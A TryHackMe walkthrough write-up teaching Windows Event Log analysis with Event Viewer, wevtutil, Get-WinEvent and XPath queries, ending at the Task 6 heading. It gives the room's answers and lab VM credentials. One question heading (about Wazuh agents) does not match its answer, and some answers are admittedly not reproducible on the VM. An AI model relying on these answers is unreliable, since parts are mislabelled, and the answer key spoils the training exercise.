# Windows Event Logs

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Medium
Tags: Windows
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Introduction to Windows Event Logs and the tools to query them.
```

Room link: [https://tryhackme.com/room/windowseventlogs](https://tryhackme.com/room/windowseventlogs)

## Solution

### Task 1: What are event logs?

Per Wikipedia, "*Event logs record events taking place in the execution of a system to provide an audit trail that can be used to understand the activity of the system and to diagnose problems. They are essential to understand the activities of complex systems, particularly in applications with little user interaction (such as server applications).*"

This definition would apply to system administrators, IT technicians, desktop engineers, etc. If the endpoint is experiencing an issue, the event logs can be queried to see clues about what led to the problem. The operating system, by default, writes messages to these logs.

As defenders (blue teamers), there is another use case for event logs. "Combining log file entries from multiple sources can also be useful. *This approach, in combination with statistical analysis, may yield correlations between seemingly unrelated events on different servers*."

This is where SIEMs (**Security Information and Event Management**) such as Splunk and Elastic come into play.

If you don't know exactly what a SIEM is used for, below is a visual overview of its capabilities.

![SIEM Capabilities](Images/SIEM_Capabilities.png)

Even though accessing a remote machine's event logs is possible, this will not be feasible in a large enterprise environment. Instead, one can view the logs from all the endpoints, appliances, etc., in a SIEM. This will allow you to query the logs from multiple devices instead of manually connecting to a single device to view its logs.

Windows is not the only operating system that uses a logging system. Linux and macOS do as well. For example, the logging system on Linux systems is known as **Syslog**. In this room, though, we're only focusing on the Windows logging system, Windows Event Logs.

#### Room Machine

Before moving forward, please deploy the machine.

You can use the **AttackBox** and **Remmina** to connect to the remote machine. Make sure the remote machine is deployed before proceeding.

Click on the plus icon, as shown below.

![Remmina RDP 1](Images/Remmina_RDP_1.png)

For the **Server**, provide `10.66.151.254` as the IP address provided to you for the remote machine. The credentials for the user account are:

- **User name**: `administrator`
- **User password**: `blueT3aming!`

![Remmina RDP 2](Images/Remmina_RDP_2.png)

Accept the Certificate when prompted, and you should be logged into the remote system now.

**Note**: The virtual machine may take up to 3 minutes to load.

---------------------------------------------------------------------------------------

### Task 2: Event Viewer

The Windows Event Logs are not text files that can be viewed using a text editor. However, the raw data can be translated into XML using the Windows API. The events in these log files are stored in a proprietary binary format with a `.evt` or `.evtx` extension. The log files with the `.evtx` file extension typically reside in `C:\Windows\System32\winevt\Logs`.

#### Elements of a Windows Event Log

Event logs are crucial for troubleshooting any computer incident and help understand the situation and how to remediate the incident. To get this picture well, you must first understand the format in which the information will be presented. Windows offers a standardized means of relaying this system information.

First, we need to know what elements form event logs in Windows systems. These elements are:

- **System Logs**: Records events associated with the Operating System segments. They may include information about hardware changes, device drivers, system changes, and other activities related to the device.
- **Security Logs**: Records events connected to logon and logoff activities on a device. The system's audit policy specifies the events. The logs are an excellent source for analysts to investigate attempted or successful unauthorized activity.
- **Application Logs**: Records events related to applications installed on a system. The main pieces of information include application errors, events, and warnings.
- **Directory Service Events**: Active Directory changes and activities are recorded in these logs, mainly on domain controllers.
File Replication Service Events: Records events associated with Windows Servers during the sharing of Group Policies and logon scripts to domain controllers, from where they may be accessed by the users through the client servers.
- **DNS Event Logs**: DNS servers use these logs to record domain events and to map out
- **Custom Logs**: Events are logged by applications that require custom data storage. This allows applications to control the log size or attach other parameters, such as ACLs, for security purposes.

Under this categorization, event logs can be further classified into types. Here, types describe the activity that resulted in the event being logged. There are 5 types of events that can be logged, as described in the table below from [docs.microsoft.com](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-types).

![Windows Event Types](Images/Windows_Event_Types.png)

There are three main ways of accessing these event logs within a Windows system:

1. **Event Viewer** (GUI-based application)
2. **Wevtutil.exe** (command-line tool)
3. **Get-WinEvent** (PowerShell cmdlet)

#### Event Viewer

In any Windows system, the Event Viewer, a **Microsoft Management Console** (MMC) snap-in, can be launched by simply right-clicking the Windows icon in the taskbar and selecting **Event Viewer**. For the savvy sysadmins that use the CLI much of their day, Event Viewer can be launched by typing `eventvwr.msc`. It is a GUI-based application that allows you to interact quickly with and analyze logs.

Event Viewer has three panes.

1. The pane on the left provides a hierarchical tree listing of the event log providers.
2. The pane in the middle will display a general overview and summary of the events specific to a selected provider.
3. The pane on the right is the actions pane.

![Event Viewer Panes](Images/Event_Viewer_Panes.gif)

The standard logs we had earlier defined on the left pane are visible under **Windows Logs**.

The following section is the **Applications and Services Logs**. Expand this section and drill down on `Microsoft` > `Windows` > `PowerShell` > `Operational`. PowerShell will log operations from the engine, providers, and cmdlets to the Windows event log.

Right-click on `Operational` then `Properties`.

![PowerShell Operational Properties](Images/PowerShell_Operational_Properties.png)

Within **Properties**, you see the log location, log size, and when it was created, modified, and last accessed. Within the Properties window, you can also see the maximum set log size and what action to take once the criteria are met. This concept is known as log rotation. These are discussions held with corporations of various sizes. How long does it take to keep logs, and when it's permissible to overwrite them with new data.

Lastly, notice the **Clear Log** button at the bottom right. There are legitimate reasons to use this button, such as during security maintenance, but adversaries will likely attempt to clear the logs to go undetected. **Note**: This is not the only method to remove the event logs for any given event provider.

Focus your attention on the middle pane. Remember from previous descriptions that this pane will display the events specific to a selected provider. In this case, **PowerShell/Operational**.

![PowerShell Operational Example 1](Images/PowerShell_Operational_Example_1.png)

From the above image, notice the event provider's name and the number of events logged. In this case, there are 44 events logged. You might see a different number. No worries, though. Each column of the pane presents a particular type of information as described below:

- **Level**: Highlights the log recorded type based on the identified event types specified earlier. In this case, the log is labeled as **Information**.
- **Date and Time**: Highlights the time at which the event was logged.
- **Source**: The name of the software that logs the event is identified. From the above image, the source is PowerShell.
- **Event ID**: This is a predefined numerical value that maps to a specific operation or event based on the log source. This makes Event IDs not unique, so `Event ID 4103` in the above image is related to Executing Pipeline but will have an entirely different meaning in another event log.
- **Task Category**: Highlights the Event Category. This entry will help you organize events so the Event Viewer can filter them. The event source defines this column.

The middle pane has a split view. More information is displayed in the bottom half of the middle pane for any event you click on.

This section has two tabs: **General** and **Details**.

- General is the default view, and the rendered data is displayed.
- The Details view has two options: Friendly view and XML view.

Below is a snippet of the General view.

![PowerShell Operational Example 2](Images/PowerShell_Operational_Example_2.png)

Lastly, take a look at the **Actions** pane. Several options are available, but we'll only focus on a few. Please examine all the actions that can be performed at your leisure if you're unfamiliar with MMC snap-ins.

As you should have noticed, you can open a saved log within the Actions pane. This is useful if the remote machine can't be accessed. The logs can be provided to the analyst. You will perform this action a little later.

The **Create Custom View** and **Filter Current Log** are nearly identical. The only difference between the two is that the `By log` and `By source` radio buttons are greyed out in Filter Current Log. What is the reason for that? The filter you can make with this specific action only relates to the current log. Hence no reason for 'by log' or 'by source' to be enabled.

![Event Viewer Filter Actions](Images/Event_Viewer_Filter_Actions.gif)

Why are these actions beneficial? Say, for instance, you don't want all the events associated with PowerShell/Operational cluttering all the real estate in the pane. Maybe you're only interested in 4104 events. That is possible with these two actions.

To view event logs from another computer, right-click `Event Viewer (Local)` > `Connect to Another Computer...`

![Event Viewer Remote Connect](Images/Event_Viewer_Remote_Connect.png)

That will conclude the general overview of the Event Viewer—time to become familiar with the tool.

**Note**: Don't forget to deploy the machine for this room before proceeding. Give the room about 3 minutes to load fully.

---------------------------------------------------------------------------------------

For the questions below, use Event Viewer to analyze **Microsoft-Windows-PowerShell/Operational** log.

#### How many agents does this Wazuh management server manage?

Hint: Sort the date and time column into an ascending order and look for the earliest recorded event.

Open **Event Viewer** and browse to `Applications and Services Logs` > `Microsoft` > `Windows` > `PowerShell` > `Operational`.

Click on the `Date and Time` column to sort the events in ascending order and goto the first event.

The first events are EID 4104 (Scriptblock logging) but for unknown reasons we should ignore these.

The next event is EID 4103 (Module logging).

![PowerShell Operational Example 3](Images/PowerShell_Operational_Example_3.png)

Answer: `4103`

#### Filter on Event ID 4104. What was the 2nd command executed in the PowerShell session?

Hint: Check the ScriptBlockText

**Note** the events in Event Viewer doesn't add up to the expected answers. This is likely due to an updated virtual machine and/or a too small maximum event log size.

The expected answer is (image from another writeup):

![PowerShell Operational Example 4](Images/PowerShell_Operational_Example_4.webp)

Answer: `whoami`

#### What is the Task Category for Event ID 4104?

See image above.

Answer: `Execute a Remote Command`

#### Analyze the Windows PowerShell log. What is the Task Category for Event ID 800?

Browse to `Applications and Services Logs` > `Windows PowerShell` and check for event IDs 800.

![PowerShell Operational Example 5](Images/PowerShell_Operational_Example_5.png)

Answer: `Pipeline Execution Details`

### Task 3: wevtutil.exe

Ok, you played around with Event Viewer. Imagine you have to sit there and manually sift through hundreds or even thousands of events (even after filtering the log). Not fun. It would be nice if you could write scripts to do this work for you. We will explore some tools that will allow you to query event logs via the command line and/or PowerShell.

Let's look at **wevtutil.exe** first. Per Microsoft, the wevtutil.exe tool "*enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs.*"

As with any tool, access its help files to find out how to run the tool. An example of a command to do this is `wevtutil.exe /?`.

```bat
PS> C:\Users\Administrator> wevtutil.exe /?
Windows Events Commandline Utility.
Enables you to retrieve information about event logs and publishers, install and uninstall event manifests, run queries, and export, archive and clear logs.

Usage:

You can use either the short (for example, ep /uni) or long (for example, enum-publishers /unicode) version of the command and option names. Commands, options and option values are not case-sensitive.

Variables are noted in all upper-case.

wevtutil COMMAND [ARGUMENT [ARGUMENT] ...] [/OPTION:VALUE [/OPTION:VALUE] ...]

Commands:

el  | enum-logs              List log names.
gl  | get-log                Get log configuration information.
sl  | set-log                Modify configuration of a log.
ep  | enum-publishers        List event publishers.
gp  | get-publisher          Get publisher configuration information.
im  | install-manifest       Install event publishers and logs from manifest.
um  | uninstall-manifest     Uninstall event publishers and logs from manifest.
qe  | query-events           Query events from a log or log file.
gli | get-log-info           Get log status information.
epl | export-log             Export a log.
al  | archive-log            Archive an exported log.
cl  | clear-log              Clear a log.
```

From the above snippet, under **Usage**, you are provided a brief example of how to use the tool. In this example, `ep` (**enum-publishers**) is used. This is a **command** for wevtutil.exe.

Below, we can find the **Common options** that can be used with Windows Events Utility.

```bat
Common Options:

/{r | remote}:VALUE
If specified, run the command on a remote computer. VALUE is the remote computer name. Options /im and /um do not support remote operations.

/{u |username}:VALUE
Specify a different user to log on to the remote computer. VALUE is a user name in the form of domain\user or user. Only applicable when option /r is specified.

/{p | password}:VALUE
Password for the specified user. If not specified, or if VALUE is "*", the user will be prompted to enter a password. Only applicable when the /u option is specified.

/{a | authentication}:[Default|Negotiate|Kerberos|NTLM]
Authentication type for connecting to remote computer. The default is Negotiate.

/uni | unicode}:[true|false]
Display output in Unicode. If true, then output is in Unicode.

To learn more about a specific command, type the following:

wevtutil COMMAND /?
```

Notice at the bottom of the above snapshot, `wevtutil COMMAND /?`. This will provide additional information specific to a command. We can use it to get more information on the command `qe` (**query-events**).

```bat
PS> C:\Users\Administrator> wevtutil qe /?
Read events from an event log, log file or using a structured query.

Usage:

wevtutil {qe | query-events}  [/OPTION:VALUE [/OPTION:VALUE]...]
```

Look over the information within the help menu to fully understand how to use this command.

Ok, great! You have enough information to use this tool—time to answer some questions. It is always recommended to look into the tool and its related information at your own leisure.

**Note**: You can get more information about using this tool further but visiting the online help documentation [docs.microsoft.com](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil).

---------------------------------------------------------------------------------------

#### How many log names are in the machine?

Hint: Use PowerShell. Pipe the 'el' command to the PowerShell Measure-Object cmdlet

Open an **elevated** PowereShell window and run

```powershell
PS C:\Users\Administrator> wevtutil.exe enum-logs | Measure-Object


Count    : 1072
Average  :
Sum      :
Maximum  :
Minimum  :
Property :



PS C:\Users\Administrator> (wevtutil.exe enum-logs | Measure-Object).Count
1072
PS C:\Users\Administrator>
```

**Note** the system was likely updated since the release of the room and the "correct" expected answer is one less than the output above.

Answer: `1071`

#### What event files would be read when using the query-events command?

The answer can be found on the [documentation page for wevtutil.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil):

![WevtUtil Example 1](Images/WevtUtil_Example_1.png)

Answer: `event log, log file, structured query`

#### What option would you use to provide a path to a log file?

Hint: wevtutil qe /?

```powershell
PS C:\Users\Administrator> wevtutil qe /?
Read events from an event log, log file or using structured query.

Usage:

wevtutil { qe | query-events } <PATH> [/OPTION:VALUE [/OPTION:VALUE] ...]

<PATH>
By default, you provide a log name for the <PATH> parameter. However, if you use
the /lf option, you must provide the path to a log file for the <PATH> parameter.
If you use the /sq parameter, you must provide the path to a file containing a
structured query.

Options:

You can use either the short (for example, /f) or long (for example, /format)
version of the option names. Options and their values are not case-sensitive.

/{lf | logfile}:[true|false]
If true, <PATH> is the full path to a log file.

<---snip--->
```

Answer: `/lf:true`

#### What is the VALUE for /q?

Hint: wevtutil qe /?

```powershell
PS C:\Users\Administrator> wevtutil qe /?
Read events from an event log, log file or using structured query.

Usage:

<---snip--->

/{q | query}:VALUE
VALUE is an XPath query to filter events read. If not specified, all events will
be returned. This option is not available when /sq is true.
<---snip--->
```

Answer: `Xpath query`

The questions below are based on this command: wevtutil qe Application /c:3 /rd:true /f:text

#### What is the log name?

Answer: `Application`

#### What is the /rd option for?

```powershell
PS C:\Users\Administrator> wevtutil qe /?
Read events from an event log, log file or using structured query.

Usage:

<---snip--->

/{rd | reversedirection}:[true|false]
Event read direction. If true, the most recent events are returned first.
<---snip--->
```

Answer: `Event read direction`

#### What is the /c option for?

```powershell
PS C:\Users\Administrator> wevtutil qe /?
Read events from an event log, log file or using structured query.

Usage:

<---snip--->

/{c | count}:<n>
Maximum number of events to read.
<---snip--->
```

Answer: `Maximum number of events to read`

### Task 4: Get-WinEvent

#### Get-WinEvent

On to the next tool. This is a PowerShell cmdlet called **Get-WinEvent**. Per Microsoft, the Get-WinEvent cmdlet "*gets events from event logs and event tracing log files on local and remote computers.*" It provides information on event logs and event log providers. Additionally, you can combine numerous events from multiple sources into a single command and filter using XPath queries, structured XML queries, and hash table queries.

**Note**: The **Get-WinEvent** cmdlet replaces the **Get-EventLog** cmdlet.

As with any new tool, it's good practice to read the Get-Help documentation to become acquainted with its capabilities. Please refer to the Get-Help information online at [docs.microsoft.com](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-5.1).

Let us look at a couple of examples of how to use Get-WinEvent, as supported by the documentation. Some tasks might require some PowerShell-fu, while others don't. Even if your PowerShell-fu is not up to par, fret not; each example has a detailed explanation of the commands/cmdlets used.

#### Example 1: Get all logs from a computer

Here, we are obtaining all event logs locally, and the list starts with classic logs first, followed by new Windows Event logs. It is possible to have a log's **RecordCount** be zero or null.

```powershell
Get-WinEvent -ListLog *

LogMode   MaximumSizeInBytes RecordCount LogName
-------   ------------------ ----------- -------
Circular            15532032       14500 Application
Circular             1052672         117 Azure Information Protection
Circular             1052672        3015 CxAudioSvcLog
Circular            20971520             ForwardedEvents
Circular            20971520           0 HardwareEvents
```

#### Example 2: Get event log providers and log names

The command here will result in the event log providers and their associated logs. The **Name** is the provider, and **LogLinks** is the log that is written to.

```powershell
Get-WinEvent -ListProvider *

Name     : .NET Runtime
LogLinks : {Application}
Opcodes  : {}
Tasks    : {}

Name     : .NET Runtime Optimization Service
LogLinks : {Application}
Opcodes  : {}
Tasks    : {}
```

#### Example 3: Log filtering

Log filtering allows you to select events from an event log. We can filter event logs using the **Where-Object** cmdlet as follows:

```powershell
PS C:\Users\Administrator> Get-WinEvent -LogName Application | Where-Object { $_.ProviderName -Match 'WLMS' }

   ProviderName: WLMS

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
12/21/2020 4:23:47 AM          100 Information
12/18/2020 3:18:57 PM          100 Information
12/15/2020 8:50:22 AM          100 Information
12/15/2020 8:18:34 AM          100 Information
12/15/2020 7:48:34 AM          100 Information
12/14/2020 6:42:18 PM          100 Information
12/14/2020 6:12:18 PM          100 Information
12/14/2020 5:39:08 PM          100 Information
12/14/2020 5:09:08 PM          100 Information
```

**Tip**: If you are ever working on a Windows evaluation virtual machine that is cut off from the Internet eventually, it will shut down every hour. ;^)

When working with large event logs, per Microsoft, it's inefficient to send objects down the pipeline to a `Where-Object` command. The use of the Get-WinEvent cmdlet's **FilterHashtable** parameter is recommended to filter event logs. We can achieve the same results as above by running the following command:

```powershell
Get-WinEvent -FilterHashtable @{
  LogName='Application' 
  ProviderName='WLMS' 
}
```

The syntax of a hash table is as follows:

```powershell
@{ <name> = <value>; [<name> = <value> ] ...}
```

Guidelines for defining a hash table are:

- Begin the hash table with an `@` sign.
- Enclose the hash table in braces `{}`
- Enter one or more key-value pairs for the content of the hash table.
- Use an equal sign (`=`) to separate each key from its value.

**Note**: You don't need to use a semicolon if you separate each key/value with a new line, as in the screenshot above for the `-FilterHashtable` for `ProviderName='WLMS'`.

Below is a table that displays the accepted key/value pairs for the Get-WinEvent FilterHashtable parameter.

![Get-WinEvent FilterHashTable](Images/Get-WinEvent_FilterHashTable.png)

When building a query with a hash table, Microsoft recommends making the hash table one key-value pair at a time. Event Viewer can provide quick information on what you need to build your hash table.

![Event Viewer Filter Example](Images/Event_Viewer_Filter_Example.png)

Based on this information, the hash table will look as follows:

![Get-WinEvent FilterHashTable 2](Images/Get-WinEvent_FilterHashTable_2.png)

For more information on creating Get-WinEvent queries with FilterHashtable, check the official Microsoft documentation [docs.microsoft.com](https://docs.microsoft.com/en-us/powershell/scripting/samples/Creating-Get-WinEvent-queries-with-FilterHashtable?view=powershell-7.1).

Since we're on the topic of Get-WinEvent and FilterHashtable, here is a command that you might find helpful (shared by [@mubix](https://twitter.com/mubix)):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString'
```

You can read more about creating hash tables in general [docs.microsoft.com](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_hash_tables?view=powershell-7.1).

---------------------------------------------------------------------------------------

Answer the following questions using the [online help](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/Get-WinEvent?view=powershell-7.1) documentation for **Get-WinEvent**

#### Execute the command from Example 1 (as is). What are the names of the logs related to OpenSSH?

```powershell
PS C:\Users\Administrator> Get-WinEvent -ListLog *openssh*

LogMode   MaximumSizeInBytes RecordCount LogName
-------   ------------------ ----------- -------
Circular             1052672           0 OpenSSH/Admin
Circular             1052672           0 OpenSSH/Operational
```

Answer: `OpenSSH/Admin,OpenSSH/Operational`

#### Execute the command from Example 8. Instead of the string `*Policy*` search for `*PowerShell*`. What is the name of the 3rd log provider?

```powershell
PS C:\Users\Administrator> Get-WinEvent -ListProvider *powershell*


Name     : PowerShell
LogLinks : {Windows PowerShell}
Opcodes  : {}
Tasks    : {Engine Health
           , Command Health
           , Provider Health
           , Engine Lifecycle
           ...}

Name     : Microsoft-Windows-PowerShell
LogLinks : {Microsoft-Windows-PowerShell/Operational, Microsoft-Windows-PowerShell/Analytic, Microsoft-Windows-PowerShell/Debug,
           Microsoft-Windows-PowerShell/Admin}
Opcodes  : {win:Start, win:Stop, Open, Close...}
Tasks    : {CreateRunspace, ExecuteCommand, Serialization, Powershell-Console-Startup...}

Name     : Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager
LogLinks : {Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Operational,
           Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Analytic,
           Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager/Debug}
Opcodes  : {}
Tasks    : {FileDownloadManagerDownload, FileDownloadManagerValidate}
```

Answer: `Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager`

#### Execute the command from Example 9. Use Microsoft-Windows-PowerShell as the log provider. How many event ids are displayed for this event provider?

Hint: Pipe to the Measure-Object cmdlet. Don’t omit 'Format-Table Id, Description' from the query.

```powershell
PS C:\Users\Administrator> (Get-WinEvent -ListProvider Microsoft-Windows-PowerShell).Events | Format-Table Id, Description | Measure-Object


Count    : 192
Average  :
Sum      :
Maximum  :
Minimum  :
Property :



PS C:\Users\Administrator> ((Get-WinEvent -ListProvider Microsoft-Windows-PowerShell).Events | Format-Table Id, Description | Measure-Object).Count
192
PS C:\Users\Administrator>
```

Answer: `192`

#### How do you specify the number of events to display?

```powershell
PS C:\Users\Administrator> Get-WinEvent -?

Do you want to run Update-Help?
The Update-Help cmdlet downloads the most current Help files for Windows PowerShell modules, and installs them on your computer. For more information
about the Update-Help cmdlet, see https:/go.microsoft.com/fwlink/?LinkId=210614.
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): n

NAME
    Get-WinEvent

SYNTAX
    Get-WinEvent [[-LogName] <string[]>] [-MaxEvents <long>] [-ComputerName <string>] [-Credential <pscredential>] [-FilterXPath <string>] [-Force]
    [-Oldest]  [<CommonParameters>]

    Get-WinEvent [-ListLog] <string[]> [-ComputerName <string>] [-Credential <pscredential>] [-Force]  [<CommonParameters>]

    Get-WinEvent [-ListProvider] <string[]> [-ComputerName <string>] [-Credential <pscredential>]  [<CommonParameters>]

    Get-WinEvent [-ProviderName] <string[]> [-MaxEvents <long>] [-ComputerName <string>] [-Credential <pscredential>] [-FilterXPath <string>] [-Force]
    [-Oldest]  [<CommonParameters>]

    Get-WinEvent [-Path] <string[]> [-MaxEvents <long>] [-Credential <pscredential>] [-FilterXPath <string>] [-Oldest]  [<CommonParameters>]

    Get-WinEvent [-FilterHashtable] <hashtable[]> [-MaxEvents <long>] [-ComputerName <string>] [-Credential <pscredential>] [-Force] [-Oldest]
    [<CommonParameters>]

    Get-WinEvent [-FilterXml] <xml> [-MaxEvents <long>] [-ComputerName <string>] [-Credential <pscredential>] [-Oldest]  [<CommonParameters>]


ALIASES
    None


REMARKS
    Get-Help cannot find the Help files for this cmdlet on this computer. It is displaying only partial help.
        -- To download and install Help files for the module that includes this cmdlet, use Update-Help.
        -- To view the Help topic for this cmdlet online, type: "Get-Help Get-WinEvent -Online" or
           go to https://go.microsoft.com/fwlink/?LinkID=138336.
```

Answer: `-MaxEvents`

#### When using the FilterHashtable parameter and filtering by level, what is the value for Informational?

Hint: Check the online help documentation

From the [online documentation](https://learn.microsoft.com/en-us/powershell/scripting/samples/creating-get-winevent-queries-with-filterhashtable?view=powershell-7.5#filtering-by-level):

|Name|Value|
|----|----|
|Verbose|5|
|Informational|4|
|Warning|3|
|Error|2|
|Critical|1|
|LogAlways|0|

Answer: `4`

### Task 5: XPath Queries

Now we will examine filtering events with **XPath**. The W3C created XPath, or **XML Path Language** in full, to provide a standard syntax and semantics for addressing parts of an XML document and manipulating strings, numbers, and booleans. The Windows Event Log supports a subset of [XPath 1.0](https://www.w3.org/TR/1999/REC-xpath-19991116/).

Below is an example XPath query along with its explanation:

```powershell
// The following query selects all events from the channel or log file where the severity level is less than or equal to 3 and the event occurred in the last 24 hour period. 
XPath Query: *[System[(Level <= 3) and TimeCreated[timediff(@SystemTime) <= 86400000]]]
```

Based on [docs.microsoft.com](https://docs.microsoft.com/en-us/windows/win32/wes/consuming-events#xpath-10-limitations), an XPath event query starts with `*` or `Event`. The above code block confirms this. But how do we construct the rest of the query? Luckily the Event Viewer can help us with that.

Let's create an XPath query for the same event from the previous section. Note that both wevtutil and Get-WinEvent support XPath queries as event filters.

![XPath Example 1](Images/XPath_Example_1.png)

Draw your attention to the bottom half of the middle pane. In the Event Viewer section, the Details tab was briefly touched on. Now you'll see how the information in this section can be useful.

Click on the `Details` tab and select the `XML View` radio button. Don't worry if the log details you are viewing are slightly different. The point is understanding how to use the XML View to construct a valid XPath query.

![XPath Example 2](Images/XPath_Example_2.png)

The first tag is the starting point. This can either be an `*` or the word `Event`.

The command so far looks like this: `Get-WinEvent -LogName Application -FilterXPath '*'`

![XPath Example 3](Images/XPath_Example_3.png)

Now we work our way down the XML tree. The next tag is `System`.

Let's add that. Now our command is: `Get-WinEvent -LogName Application -FilterXPath '*/System/'`

**Note**: Its best practice to explicitly use the keyword `System` but you can use an `*` instead as with the `Event` keyword. The query `-FilterXPath '*/*'` is still valid.

The **Event ID** is **100**. Let's plug that into the command.

![XPath Example 4](Images/XPath_Example_4.png)

Our command now is: `Get-WinEvent -LogName Application -FilterXPath '*/System/EventID=100'`

```powershell
PS C:\Users\Administrator> Get-WinEvent -LogName Application -FilterXPath '*/System/EventID=100'

   ProviderName: WLMS

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
12/21/2020 4:23:47 AM          100 Information
12/18/2020 3:18:57 PM          100 Information
12/15/2020 8:50:22 AM          100 Information
12/15/2020 8:18:34 AM          100 Information
12/15/2020 7:48:34 AM          100 Information
12/14/2020 6:42:18 PM          100 Information
12/14/2020 6:12:18 PM          100 Information
12/14/2020 5:39:08 PM          100 Information
12/14/2020 5:09:08 PM          100 Information
```

When using **wevtutil.exe** and XPath to query for the same event log and ID, this is our result:

```powershell
C:\Users\Administrator>wevtutil.exe qe Application /q:*/System[EventID=100] /f:text /c:1
Event[0]:
  Log Name: Application
  Source: WLMS
  Date: 2020-12-14T17:09:08.940
  Event ID: 100
  Task: None
  Level: Information
  Opcode: Info
  Keyword: Classic
  User: N/A
  User Name: N/A
  Computer: WIN-1O0UJBNP9G7
  Description:
N/A
```

**Note**: Two additional parameters were used in the above command. This was done to retrieve just 1 event and for it not to contain any XML tags.

If you want to query a different element, such as `Provider Name`, the syntax will be different. To filter on the provider, we need to use the `@Name` attribute of `Provider`.

The XPath query is:

```powershell
PS C:\Users\Administrator> Get-WinEvent -LogName Application -FilterXPath '*/System/Provider[@Name="WLMS"]'

   ProviderName: WLMS

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
12/21/2020 4:23:47 AM          100 Information
12/18/2020 3:18:57 PM          100 Information
12/15/2020 8:50:22 AM          100 Information
12/15/2020 8:48:34 AM          101 Information
12/15/2020 8:18:34 AM          100 Information
12/15/2020 7:48:34 AM          100 Information
12/14/2020 7:12:18 PM          101 Information
12/14/2020 6:42:18 PM          100 Information
12/14/2020 6:12:18 PM          100 Information
12/14/2020 6:09:09 PM          101 Information
12/14/2020 5:39:08 PM          100 Information
12/14/2020 5:09:08 PM          100 Information
```

What if you want to combine 2 queries? Is this possible? The answer is yes.

Let's build this query based on the screenshot above. The Provider Name is **WLMS**, and based on the output, there are 2 Event IDs.

This time we only want to query for events with **Event ID 101**.

The XPath query would be `Get-WinEvent -LogName Application -FilterXPath '*/System/EventID=101 and */System/Provider[@Name="WLMS"]'`

```powershell
PS C:\Users\Administrator> Get-WinEvent -LogName Application -FilterXPath '*/System/EventID=101 and */System/Provider[@Name="WLMS"]'

   ProviderName: WLMS

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
12/15/2020 8:48:34 AM          101 Information
12/14/2020 7:12:18 PM          101 Information
12/14/2020 6:09:09 PM          101 Information
```

Lastly, let's discuss how to create XPath queries for elements within `EventData`. The query will be slightly different.

**Note**: The EventData element doesn't always contain information.

Below is the XML View of the event for which we will build our XPath query.

![XPath Example 5](Images/XPath_Example_5.png)

We will build the query for `TargetUserName`. In this case, that will be **System**. The XPath query would be  
`Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name="TargetUserName"]="System"'`

```powershell
PS C:\Users\Administrator> Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name="TargetUserName"]="System"' -MaxEvents 1

   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
12/21/2020 10:50:26 AM         4624 Information     An account was successfully logged on...
```

**Note**: The `-MaxEvents` parameter was used, and it was set to 1. This will return just 1 event.

At this point, you have enough knowledge to create XPath queries for **wevtutil.exe** or **Get-WinEvent**. To further this knowledge, I suggest reading the official Microsoft XPath Reference [docs.microsoft.com](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms256115(v=vs.100)).

---------------------------------------------------------------------------------------

#### Using the knowledge gained on Get-WinEvent and XPath, what is the query to find WLMS events with a System Time of 2020-12-15T01:09:08.940277500Z?

Hint: Running on PowerShell, the key XML elements to be used are the `*/System/Provider[@Name=""]` and `*/System/TimeCreated[@SystemTime=""]` filters.

Answer: `Get-WinEvent -LogName Application -FilterXPath '*/System/Provider[@Name="WLMS"] and */System/TimeCreated[@SystemTime="2020-12-15T01:09:08.940277500Z"]'`

#### Using Get-WinEvent and XPath, what is the query to find a user named Sam with an Logon Event ID of 4720?

Answer: `Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name="TargetUserName"]="Sam" and */System/EventID=4720'`

#### Based on the previous query, how many results are returned?

```powershell
PS C:\Users\Administrator> Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name="TargetUserName"]="Sam" and */System/EventID=4720'
Get-WinEvent : No events were found that match the specified selection criteria.
At line:1 char:1
+ Get-WinEvent -LogName Security -FilterXPath '*/EventData/Data[@Name=" ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (:) [Get-WinEvent], Exception
    + FullyQualifiedErrorId : NoMatchingEventsFound,Microsoft.PowerShell.Commands.GetWinEventCommand

PS C:\Users\Administrator>
```

**Note** the system likely has a too small maximum event log size for the Security log and the event have been phased out.

The "correct" expected answer is 2.

Answer: `2`

#### Based on the output from the question #2, what is Message?

We can find the answer in the online documentation for [EID 4720](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4720)

Answer: `A user account was created`

#### Still working with Sam as the user, what time was Event ID 4724 recorded? (MM/DD/YYYY H:MM:SS [AM/PM])

See above note about missing/phased out events.

Answer: `12/17/2020 1:57:14 PM`

#### What is the Provider Name?

Answer: `Microsoft-Windows-Security-Auditing`

### Task 6: Event IDs

